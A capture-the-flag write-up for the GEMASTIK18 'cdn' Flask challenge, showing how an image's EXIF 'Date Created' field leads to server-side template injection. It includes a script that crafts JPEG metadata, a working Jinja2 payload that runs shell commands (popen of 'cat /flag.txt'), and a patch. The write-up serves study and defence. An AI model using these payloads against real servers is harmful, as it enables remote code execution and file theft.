---
layout: challenge.njk
title: cdn
category: Web
part: Final
author: faizath
flag: "GEMASTIK18{test_flag}"
flagTeaser: "GEMASTIK18{...} (SSTI)"
description: "A Flask image CDN that extracts the EXIF “Date Created” field and reflects it into a template — a Server-Side Template Injection via a hand-crafted JPEG."
attachments:
  - { name: app.py, path: /files/final/cdn/app.py }
  - { name: patch_jpeg_datecreated.py, path: /files/final/cdn/patch_jpeg_datecreated.py }
  - { name: poc_ssti_attack.py, path: /files/final/cdn/poc_ssti_attack.py }
tags: [ssti, jinja2, flask, exif, jpeg]
---

## Recon

We are given a RAR archive that extracts to the source of the **cdn** challenge — a Python/Flask
web service where users can upload image files.

The interesting part: the EXIF **"Date Created"** metadata of an uploaded image is extracted and
loaded as a caption/description. From `chall/app.py` (around lines 240–250):

```python
if request.args.get("meta") == "1":
    return Response((post["metadata"] or ""), mimetype="text/plain")
metadata_full = post["metadata"] or ""
md_map = {"File Name": "", "Date Created": ""}
for m in re.finditer(r"^\s*(File Name|Date Created)\s*:\s*(.*)$", metadata_full, flags=re.MULTILINE):
    key = m.group(1)
    val = m.group(2).strip()
    md_map[key] = val
file_name_val = md_map["File Name"]
date_created_val = md_map["Date Created"]
metadata_snippet_html = f"<pre>File Name: {file_name_val}\nDate Created: {date_created_val}</pre>"
```

For example, `1x1.jpg` has an EXIF `Date Created : 2025:10:28 00:00:00`, and that value is shown on
the website. Because the extracted value flows into template rendering (Flask's Jinja2 engine), the
service is potentially vulnerable to **Server-Side Template Injection (SSTI)**.

## Exploitation

At first I tried to set the payload with `exiftool` directly, but it rejects an invalid `Date`
value. So instead I built the JPEG by hand with a small Python bit-manipulation script, injecting
the classic `{{7*7}}` probe into both the IPTC (2:55 Date Created) and XMP
(`photoshop:DateCreated`) fields:

```python
# patch_jpeg_datecreated.py
# Usage: python3 patch_jpeg_datecreated.py input.jpg output.jpg
import sys, struct

PAYLOAD = b"{{7*7}}"

def find_insert_pos(jpg: bytes) -> int:
    # Parse markers until Start Of Scan (SOS, 0xFFDA); insert before SOS
    i = 2
    n = len(jpg)
    while i+1 < n:
        if jpg[i] != 0xFF:
            i += 1
            continue
        while i < n and jpg[i] == 0xFF:
            i += 1
        if i >= n: break
        marker = jpg[i]; i += 1
        if marker in (0xD8, 0xD9):
            continue
        if marker == 0xDA:
            return i-2
        if i+2 > n: break
        seg_len = struct.unpack(">H", jpg[i:i+2])[0]
        i += seg_len
    return n-2 if n >= 2 and jpg[-2:] == b"\xFF\xD9" else n

def mk_app13_iptc_date_created(value: bytes) -> bytes:
    iptc = b"\x1C\x02\x37" + struct.pack(">H", len(value)) + value
    irb = b"8BIM" + struct.pack(">H", 0x0404) + b"\x00"
    if len(irb) % 2: irb += b"\x00"
    irb += struct.pack(">I", len(iptc)) + iptc
    if len(iptc) % 2: irb += b"\x00"
    payload = b"Photoshop 3.0\x00" + irb
    return b"\xFF\xED" + struct.pack(">H", len(payload)+2) + payload

def mk_app1_xmp_date_created(value: bytes) -> bytes:
    xmp_id = b"http://ns.adobe.com/xap/1.0/\x00"
    xpacket_head = b'<?xpacket begin="\\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>'
    xpacket_tail = b'<?xpacket end="w"?>'
    xml = (
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/" '
        b'photoshop:DateCreated="' + value + b'"/>'
        b'</rdf:RDF></x:xmpmeta>'
    )
    pkt = xpacket_head + xml + xpacket_tail
    payload = xmp_id + pkt
    return b"\xFF\xE1" + struct.pack(">H", len(payload)+2) + payload

def inject_segments(inp: bytes, segments) -> bytes:
    pos = find_insert_pos(inp)
    return inp[:pos] + b"".join(segments) + inp[pos:]

def main():
    src, dst = sys.argv[1], sys.argv[2]
    data = open(src, "rb").read()
    app13 = mk_app13_iptc_date_created(PAYLOAD)
    app1 = mk_app1_xmp_date_created(PAYLOAD)
    patched = inject_segments(data, [app13, app1])
    open(dst, "wb").write(patched)
    print(f"Wrote {dst} with IPTC 2:55 and XMP DateCreated = {PAYLOAD.decode()}")

if __name__ == "__main__":
    main()
```

And sure enough, the rendered "Date Created" comes back as **49**, confirming template evaluation:

![SSTI probe {{7*7}} reflected as 49](/img/cdn/ssti-49.png)

Knowing the flag lives at `/flag.txt`, we swap the probe for an RCE payload:

```jinja
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

The template evaluates it and reflects the file contents into the "Date Created" field, leaking the
flag (the local demo instance shows `GEMASTIK18{test_flag}`; the live server returns the real flag):

![SSTI reading the flag file into Date Created](/img/cdn/flag-leak.png)

## Patch

To fix the SSTI, we sanitize the input by stripping any character that could not appear in a valid
date, and we validate that the value really is a date before using it:

```python
def _escape(s):
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
             .replace('"', "&quot;").replace("'", "&#x27;"))

for m in re.finditer(r"^\s*(File Name|Date Created)\s*:\s*(.*)$", metadata_full, flags=re.MULTILINE):
    key = m.group(1)
    raw_val = m.group(2).strip()
    if key == "Date Created":
        dt_val = ""
        if re.match(r'^\d{4}:\d{2}:\d{2} \d{2}:\d{2}:\d{2}$', raw_val):
            try:
                ymd, hms = raw_val.split(" ")
                y, mo, d = ymd.split(":")
                hh, mi, ss = hms.split(":")
                dt = datetime.datetime(int(y), int(mo), int(d), int(hh), int(mi), int(ss))
                dt_val = dt.replace(tzinfo=datetime.timezone.utc).isoformat().replace("+00:00", "Z")
            except Exception:
                dt_val = ""
        elif re.match(r'^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}', raw_val):
            try:
                iso = raw_val.rstrip("Z")
                dt = datetime.datetime.fromisoformat(iso)
                dt_val = dt.replace(tzinfo=datetime.timezone.utc).isoformat().replace("+00:00", "Z")
            except Exception:
                dt_val = ""
        md_map[key] = dt_val
    else:
        md_map[key] = _escape(raw_val)[:200]
```
